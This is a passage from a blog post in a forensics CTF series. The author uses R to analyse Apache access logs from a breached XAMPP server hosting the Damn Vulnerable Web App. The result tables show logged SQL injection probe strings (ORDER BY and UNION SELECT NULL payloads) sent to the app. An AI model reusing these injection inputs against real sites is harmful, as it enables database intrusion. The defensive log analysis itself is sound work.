---
title: Investigating a Web Server Breach - Part II
author: ''
date: '2022-12-08'
slug: investigating-web-server-breach-part-ii
categories: []
tags:
  - ctf
  - windows
  - logs
type: ''
subtitle: ''
image: ''
readtime: true
---

This is one of many posts in a series I’ll be doing on [a
CTF](https://www.ashemery.com/dfir.html#Challenge1) offered by [Ali
Hadi](https://twitter.com/binaryz0ne). The CTF looks at a web server
breach and asks us to answer several questions in order to complete the
challenge. In an effort to avoid an incredibly long blog post, I’ll be
breaking this up by question, with some questions potentially taking
more than one post. You can find the chronological list of posts below,
which will be updated as more posts are added.

1.  [Analyzing the SAM Hive and security events
    Log](https://tibblesnbits.com/posts/investigating-web-server-breach-part-i)  
2.  [Analyzing the web server
    logs](https://tibblesnbits.com/posts/investigating-web-server-breach-part-ii)

## Assumptions

Before jumping in, there are a couple of assumptions I’m going to make
about you as the reader:

-   You’re interested in understanding how this analysis would look on a
    Windows machine.  
-   You’re comfortable reading code used to conduct analyses.  
-   You’re familiar with log files and the data often contained within.

If any of these are completely foreign to you, I would pause here and
spend some time familiarizing yourself with those concepts.

## Recap

In [the last blog
post](https://tibblesnbits.com/posts/investigating-web-server-breach-part-i),
we started looking at the SAM Hive and Windows Security Event Log in an
effort to answer the question “how many users have been added to the box
and how”. We were able to identify that at least two users,
`user1 (1005)` and `hacker (1006)`, were added to the machine on
September 2nd, 2015 at approximately 9:05 am PST. However, when we went
to look for the security events with event ID 4720, we found what
appeared to be suspicious activity in the logs. The thing that stood out
was an approximately 19 hour gap in the logs on the day that the users
were added; a byproduct of what appears to be `VBoxService.exe` changing
the system time on the machine. We also saw that this file didn’t seem
to exist on the disk image, which increases the suspiciousness.

## The Question

I dug a little deeper into the `VBoxService.exe` oddities, but wasn’t
able to determine anything other than the fact that we can find it in
the memory dump. There’s going to be additional blog posts in which we
examine `memdump.mem`, so I’ll hold off on showing how I was able to
extract the file until we get there. For now, I’d like to keep working
with data that we can find on the disk image, which brings us to today’s
focal point: the web server logs. I’m not sure if it’ll help us identify
*how* the users were added to the machine, but it should give us some
indication of how the attacker(s) interacted with the web server, which
could give us leads as to where to look next. So, let’s start with a
couple initial questions to get us started.

**1. What IPs interacted with our box on September 2nd?**  
**2. What do the logs show around the time the users were added?**  
**3. Do the logs provide any additional leads for where to look next?**

## The Analysis

Let’s start by loading the log file, which, as you may recall, was
stored in `%SystemRoot$\xampp\apache\logs\access.log`. I’ll be using
[R](https://www.r-project.org/about.html) and its
[tidyverse](https://www.tidyverse.org/) set of packages to analyze the
data. If you’re familiar with Python and Pandas, you should be able to
understand this code quite intuitively, but even if you’re not familiar
with code at all it should still be relatively straightforward. I’ll do
my best to explain any code snippets that I feel are not intuitively
understandable from the code itself.

Let’s start by getting a feel for what the logs even look like so we can
try to understand how to parse them.

    head -n 3 xampp-apache-access.log

    ::1 - - [23/Aug/2015:14:46:24 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"
    ::1 - - [23/Aug/2015:14:46:24 -0700] "GET /dashboard/ HTTP/1.1" 200 7327 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"
    ::1 - - [23/Aug/2015:14:46:24 -0700] "GET /dashboard/stylesheets/normalize.css HTTP/1.1" 200 6876 "http://localhost/dashboard/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"

Feels like a pretty typical log file, namely the fact that there’s no
header indicating what each “field” represents. Thankfully, the Internet
can sometimes be a magical place. If we Google for “xampp access log
format”, we’ll come across this nice
[resource](https://www.sumologic.com/blog/apache-access-log/) that
explains it all to us. Let’s use that to ingest and parse the logs

    library(tidyverse) |>
        suppressPackageStartupMessages() |>
        suppressWarnings()

    raw <- read_log("xampp-apache-access.log", show_col_types=FALSE)
    colnames(raw) <- c(
        "ip",
        "client_identity",
        "user_id",
        "timestamp",
        "method_resource_version",
        "status_code",
        "size",
        "referer",
        "user_agent"
    )

    head(raw) |> pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
ip
</th>
<th style="text-align:left;">
client_identity
</th>
<th style="text-align:left;">
user_id
</th>
<th style="text-align:left;">
timestamp
</th>
<th style="text-align:left;">
method_resource_version
</th>
<th style="text-align:right;">
status_code
</th>
<th style="text-align:right;">
size
</th>
<th style="text-align:left;">
referer
</th>
<th style="text-align:left;">
user_agent
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
23/Aug/2015:14:46:24 -0700
</td>
<td style="text-align:left;">
GET / HTTP/1.1
</td>
<td style="text-align:right;">
302
</td>
<td style="text-align:right;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
23/Aug/2015:14:46:24 -0700
</td>
<td style="text-align:left;">
GET /dashboard/ HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
7327
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
23/Aug/2015:14:46:24 -0700
</td>
<td style="text-align:left;">
GET /dashboard/stylesheets/normalize.css HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
6876
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
23/Aug/2015:14:46:24 -0700
</td>
<td style="text-align:left;">
GET /dashboard/javascripts/modernizr.js HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
51365
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
23/Aug/2015:14:46:24 -0700
</td>
<td style="text-align:left;">
GET /dashboard/stylesheets/all.css HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
472137
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
23/Aug/2015:14:46:25 -0700
</td>
<td style="text-align:left;">
GET /dashboard/images/xampp-logo.svg HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
5427
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
</tbody>
</table>

The `read_log` function does a pretty good job of automatically parsing
the fields, but I’d like to clean the data up a little more, including
getting rid of what appears to be a couple empty columns. Let’s confirm
that there’s no data in `client_identity` and `user_id`. Note that the
`|>` is R’s pipe operator, akin to `|` in Bash.

    raw |>
        count(client_identity, user_id, sort=TRUE)

    ## # A tibble: 1 × 3
    ##   client_identity user_id     n
    ##   <lgl>           <lgl>   <int>
    ## 1 NA              NA       7716

As expected, there’s no data in those two columns, so we’ll drop them.

    processed <- raw |>
        select(-client_identity, -user_id) |>
        separate(timestamp, into=c("date", "time"), sep=":", extra="merge") |>
        separate(method_resource_version, into=c("method", "resource", "http_version"), sep=" ") |>
        mutate(date=parse_date(date, format="%d/%b/%Y"))

    head(processed) |> pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
ip
</th>
<th style="text-align:left;">
date
</th>
<th style="text-align:left;">
time
</th>
<th style="text-align:left;">
method
</th>
<th style="text-align:left;">
resource
</th>
<th style="text-align:left;">
http_version
</th>
<th style="text-align:right;">
status_code
</th>
<th style="text-align:right;">
size
</th>
<th style="text-align:left;">
referer
</th>
<th style="text-align:left;">
user_agent
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
14:46:24 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
/
</td>
<td style="text-align:left;">
HTTP/1.1
</td>
<td style="text-align:right;">
302
</td>
<td style="text-align:right;">
NA
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
14:46:24 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
/dashboard/
</td>
<td style="text-align:left;">
HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
7327
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
14:46:24 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
/dashboard/stylesheets/normalize.css
</td>
<td style="text-align:left;">
HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
6876
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
14:46:24 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
/dashboard/javascripts/modernizr.js
</td>
<td style="text-align:left;">
HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
51365
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
14:46:24 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
/dashboard/stylesheets/all.css
</td>
<td style="text-align:left;">
HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
472137
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
14:46:25 -0700
</td>
<td style="text-align:left;">
GET
</td>
<td style="text-align:left;">
/dashboard/images/xampp-logo.svg
</td>
<td style="text-align:left;">
HTTP/1.1
</td>
<td style="text-align:right;">
200
</td>
<td style="text-align:right;">
5427
</td>
<td style="text-align:left;">
<http://localhost/dashboard/>
</td>
<td style="text-align:left;">
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR
2.0.50727; .NET CLR 3.0.04506)
</td>
</tr>
</tbody>
</table>

Much better. Now we can do some exploratory analyses, such as getting
the top 10 IPs that have interacted with this box, the earliest and
latest dates for which we have data, a count of activity by date, and
more. Let’s start with getting the date range for our logs.

    processed |>
        mutate(
            start_date = min(date) |> format("%Y-%m-%d"),
            end_date = max(date) |> format("%Y-%m-%d")
        ) |>
        select(start_date, end_date) |>
        slice(1) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
start_date
</th>
<th style="text-align:left;">
end_date
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
2015-08-23
</td>
<td style="text-align:left;">
2015-09-03
</td>
</tr>
</tbody>
</table>

I assume that the short time window in the logs is because this is a CTF
and not a real-world event. In a real event, we’d likely have a *much*
larger file, with many more dates to comb through. However, the
approaches we’re using here should work in those scenarios as well, as
long as our analyses are targeted and specific. Let’s see what the top
10 IPs hitting this box are. If we don’t see anything of interest, we
can narrow that down to the top 10 IPs the day the users were added.

    processed |>
        count(ip, sort=TRUE) |>
        head(10) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
ip
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
192.168.56.102
</td>
<td style="text-align:right;">
4398
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.72
</td>
<td style="text-align:right;">
461
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.54
</td>
<td style="text-align:right;">
316
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.65
</td>
<td style="text-align:right;">
302
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.58
</td>
<td style="text-align:right;">
301
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.61
</td>
<td style="text-align:right;">
301
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.62
</td>
<td style="text-align:right;">
300
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.63
</td>
<td style="text-align:right;">
300
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.66
</td>
<td style="text-align:right;">
300
</td>
</tr>
<tr>
<td style="text-align:left;">
10.20.0.68
</td>
<td style="text-align:right;">
300
</td>
</tr>
</tbody>
</table>

Wow, okay, so `192.168.56.102` has hit the box 4,398 times, which is
almost 10x more than the next IP. Now, we know that any `192.168.0.0/16`
IPs are going to be internal, private IPs, so this obviously isn’t the
IP of our attacker, but it’s still interesting and worth digging into.
Let’s see if that IP interacted with our server on September 2nd.

    processed |>
        filter(date == "2015-09-02") |>
        count(ip, sort=TRUE) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
ip
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
192.168.56.102
</td>
<td style="text-align:right;">
4319
</td>
</tr>
<tr>
<td style="text-align:left;">
::1
</td>
<td style="text-align:right;">
30
</td>
</tr>
</tbody>
</table>

Not only did that IP interact with the server on that date, it was
virtually the *only* IP that interacted with the server. I want to see
two things. First, a timeline of activity for that day and this IP, and
second a breakdown of the resources that were requested. Let’s start
with the timeline of activity.

    plot_data <- processed |>
        filter(date == "2015-09-02") |>
        filter(ip == "192.168.56.102") |>
        mutate(time = str_remove(time, " -.*")) |>
        unite(datetime, date, time, sep=" ") |>
        mutate(datetime=lubridate::ymd_hms(datetime)) |>
        count(datetime)

    ggplot(plot_data, aes(x=datetime, y=n)) +
        geom_line() +
        scale_x_datetime(date_labels="%H:%M") +
        xlab("Time") +
        ylab("Number of Events") +
        ggtitle("Access Events for 192.168.56.102 on Sep 2nd, 2015") +
        theme(
            panel.background=element_blank(),
            axis.line=element_line(color="black")
        )

![](/assets/posts/0001-01-07-investigating-web-server-breach-part-ii_files/figure-markdown_strict/timeseries-1.png)

This seems to indicate that our attacker is active pretty early in the
morning, with virtually all events taking place before 06:00 Pacific
Time. Let’s just confirm real quick that our analysis is right and that
the graph is accurately showing us the data.

    processed |>
        filter(ip == "192.168.56.102" & date == "2015-09-02" & time > "06:00:00") |>
        arrange(time) |>
        slice(1, n()) |>
        select(ip, date, time) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
ip
</th>
<th style="text-align:left;">
date
</th>
<th style="text-align:left;">
time
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
192.168.56.102
</td>
<td style="text-align:left;">
2015-09-02
</td>
<td style="text-align:left;">
23:20:00 -0700
</td>
</tr>
<tr>
<td style="text-align:left;">
192.168.56.102
</td>
<td style="text-align:left;">
2015-09-02
</td>
<td style="text-align:left;">
23:59:38 -0700
</td>
</tr>
</tbody>
</table>

The code above takes our data and filters down to our data of interest,
sorts by time, and then gets the first and last rows from the data so
that we can see the timestamps for that activity. As the data shows, our
attacker didn’t interact with the web server between 06:00 and 23:20.
But they were *very* active prior to that, with over 90 events coming in
at some points. Let’s look at what some of those requests look like.
Let’s also create a new dataset that only contains the data for this IP
and the day of interest.

    suspicious_activity <- processed |>
        filter(ip == "192.168.56.102" & date == "2015-09-02")

    suspicious_activity |>
        count(resource, sort=TRUE) |>
        head(10) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
resource
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
/dvwa/login.php
</td>
<td style="text-align:right;">
1407
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit
</td>
<td style="text-align:right;">
44
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/exec/
</td>
<td style="text-align:right;">
32
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/setup.php
</td>
<td style="text-align:right;">
17
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/security.php
</td>
<td style="text-align:right;">
15
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/xss_s/
</td>
<td style="text-align:right;">
13
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201%23&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL–%20&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%23&Submit=Submit
</td>
<td style="text-align:right;">
8
</td>
</tr>
</tbody>
</table>

Well isn’t **that** interesting?! What is “dvwa”? More importantly, look
at those explicit SQL injection calls! All right, all right, let’s stay
cool and keep our wits about us. We need to figure out what’s going on
here. Let’s start by trying to figure out what “dvwa” is. A quick Google
search tells us that it’s potentially the [Damn Vulnerable Web
App](https://github.com/digininja/DVWA), which would be interesting and
fitting for this CTF. Additionally, if we read further down on the
GitHub repo, under the “WARNING!” label, we see that the author
recommends installing XAMPP for the web server and database, which is
what we see on this machine. There are a few more analyses I want to run
on these logs, but I think my next step is to learn more about the DVWA
and see how that fits into our story here. But for now, let’s see what
the `referer` data tells us as it relates to these resource requests.

    suspicious_activity |>
        count(resource, referer, sort=TRUE) |>
        head(10) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
resource
</th>
<th style="text-align:left;">
referer
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
/dvwa/login.php
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
1405
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
43
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/exec/
</td>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/exec/>
</td>
<td style="text-align:right;">
24
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/setup.php
</td>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/setup.php>
</td>
<td style="text-align:right;">
11
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201–%20&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201%23&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL–%20&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%23&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL–%20&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&Submit=Submit
</td>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
8
</td>
</tr>
</tbody>
</table>

Not as helpful as I was hoping. Let’s just get a quick count of the
`referer` field.

    suspicious_activity |>
        count(referer, sort=TRUE) |> 
        pretty_print()

<table class=" lightable-material table table-condensed table-responsive table-striped table-hover" style="font-family: &quot;Source Sans Pro&quot;, helvetica, sans-serif; margin-left: auto; margin-right: auto; font-size: 1.125rempx; font-family: &#39;Lora&#39;, &#39;Times New Roman&#39;, serif; margin-left: auto; margin-right: auto;">
<thead>
<tr>
<th style="text-align:left;">
referer
</th>
<th style="text-align:right;">
n
</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left;">
NA
</td>
<td style="text-align:right;">
3736
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/exec/>
</td>
<td style="text-align:right;">
32
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/>
</td>
<td style="text-align:right;">
28
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/>
</td>
<td style="text-align:right;">
24
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/index.php>
</td>
<td style="text-align:right;">
20
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/>
</td>
<td style="text-align:right;">
19
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/setup.php>
</td>
<td style="text-align:right;">
17
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/>
</td>
<td style="text-align:right;">
17
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/images/>
</td>
<td style="text-align:right;">
16
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/security.php>
</td>
<td style="text-align:right;">
16
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/howto.html>
</td>
<td style="text-align:right;">
15
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/>
</td>
<td style="text-align:right;">
10
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_s/>
</td>
<td style="text-align:right;">
10
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/>
</td>
<td style="text-align:right;">
8
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/css/>
</td>
<td style="text-align:right;">
7
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/includes/DBMS/>
</td>
<td style="text-align:right;">
7
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/login.php>
</td>
<td style="text-align:right;">
7
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/stylesheets/>
</td>
<td style="text-align:right;">
6
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/icons/>
</td>
<td style="text-align:right;">
6
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/dvwa/js/>
</td>
<td style="text-align:right;">
5
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit>
</td>
<td style="text-align:right;">
5
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dvwa/vulnerabilities/xss_r/>
</td>
<td style="text-align:right;">
5
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-vhosts/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/deploy-git-app/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/install-wordpress/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
<http://192.168.56.101/dashboard/docs/images/reset-mysql-password/>
</td>
<td style="text-align:right;">
4
</td>
</tr>
<tr>
<td style="text-align:left;">
